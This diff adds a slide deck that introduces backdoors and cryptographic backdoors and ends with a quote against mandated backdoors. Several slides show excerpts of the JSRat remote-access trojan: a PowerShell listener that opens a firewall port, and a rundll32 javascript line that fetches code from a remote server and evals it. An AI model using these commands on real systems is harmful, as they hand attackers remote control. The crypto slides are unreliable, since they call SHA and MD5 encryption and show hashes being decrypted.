@@ -1,0 +1,192 @@
+import { Head, Notes, Image, Appear } from 'mdx-deck'
+
+export { theme } from './theme'
+
+<Head>
+  <title>Presentation Title</title>
+</Head>
+
+# Cryptographic Backdoors
+
+```jsx
+                                  by Pierre Hérissé
+```
+
+---
+
+# What is it ?
+
+---
+
+# Backdoor :
+<ul>
+  <Appear>
+    <li>hidden method</li>
+    <li>to bypass normal behavior</li>
+    <li>of authentication or encryption </li>
+    <li>of a system</li>
+  </Appear>
+</ul>
+
+---
+
+<h3>legal software</h3>
+<h3>+</h3>
+```jsx
+  illegal backdoor
+```
+<h3>=</h3>
+```jsx
+   Trojan Horse
+```
+
+---
+
+## Example : JSRat (PowerShell)
+<https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1>
+
+---
+### [ JSRat-1 ] - Start a web server & wait for the client command
+```jsx
+  $Server = '192.168.1.14' #Listening IP.
+
+  $listener = New-Object System.Net.HttpListener
+  $listener.Prefixes.Add('http://+:80/')
+
+  netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
+  netsh advfirewall firewall add rule name="PoshRat 80" dir=in
+  action=allow protocol=TCP localport=80 | Out-Null
+
+  $listener.Start()
+  'Listening ...'
+
+  try {
+    h.Open("GET","http://'+$Server+'/rat",false);
+    h.Send();
+    c = h.ResponseText;
+  }
+  ...
+```
+---
+
+<Image src="./JSRat/listenning.png" size="95vw"/>
+
+---
+
+### [ JSRat-2 ] - When user visits this JavaScript command URL, the connection is established 👌
+```jsx
+  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";
+  document.write();
+  h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  w=new%20ActiveXObject("WScript.Shell");
+
+  try { v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\
+        CurrentVersion\\Internet%20Settings\\ProxyServer");
+        ... h.SetProxy(2,q);
+  } catch(e){}
+
+  h.Open("GET","http://192.168.1.14/connect", false);
+  try { h.Send(); B=h.ResponseText; eval(B); }
+  catch(e) { new%20ActiveXObject("WScript.Shell").Run(
+      "cmd /c taskkill /f /im rundll32.exe",0,true
+  )}
+```
+---
+
+<Image src="./JSRat/connect.png" size="90vw"/>
+
+---
+
+<Image src="./JSRat/example_connected.png" size="90vw"/>
+
+---
+
+### [ JSRat-3 ] - Commands can now be executed on the target like any other normal command prompt 😇
+
+---
+
+# Cryptographic :
+<ul>
+  <Appear>
+    <li>suite of algorithms</li>
+    <li>to implement security and confidentiality</li>
+    <li>3 algorithms :<ul>
+      <Appear>
+        <li>key generation</li>
+        <li>encryption (SHA, MD5, etc.)</li>
+        <li>decryption </li>
+      </Appear>
+    </ul> </li>
+  </Appear>
+</ul>
+
+---
+
+```
+cipher = [ encryption, decryption ]
+```
+
+---
+
+  #### => Frontdoor key : cipher chosen by the encryptor
+  ```jsx
+      => regular password
+  ```
+  #### => Backdoor key : cipher chosen by the algorithm designer
+  ```jsx
+      => master password
+  ```
+
+---
+
+  #### Symmetrical encryption : same key to encrypt & decrypt
+  ```jsx
+    password = "toto"
+    hash = encrypt(password) // hash = ************
+    dehash = decrypt(hash) // dehash = toto
+  ```
+  #### Asymmetrical encryption : uses a cipher [encrypt, decrypt]
+  ```jsx
+    password = "toto"
+    hash = encrypt(password) // hash = ************
+    superHash = cipher.encrypt(hash) // superHash = ############
+  ```
+  ❗️ cipher.encrypt is public, but cipher.decrypt is secret ❗️
+
+---
+
+
+  #### Backdoor encryption :
+  ```jsx
+  password = "toto"
+  hash = randomEncrypt(password)
+             // hash = ***###***###***
+
+  superHash = cipher.encrypt(hash)
+           // superHash = #*#*#*#*#*#*#*#*#
+
+  masterHash = masterKey.cipher.encrypt(superHash);
+         // masterHash = #**##;;;#*#***##;#***;;###
+
+  backdoorHash = {header: superHash, password: masterHash}
+  ```
+
+---
+
+Sources : <https://crypto.stackexchange.com/questions/32840/laymans-explanation-of-encryption-backdoors>
+
+
+
+---
+
+
+```jsx
+« Mandatory cryptographic backdoors will leave all of
+us at increased risk of data compromise, possibly
+on a massive scale, by crooks and terrorists…
+
+…whose illegal activities we will be able to
+eavesdrop and investigate only if they too comply
+with the law, by using backdoored encryption software
+themselves. »
+```
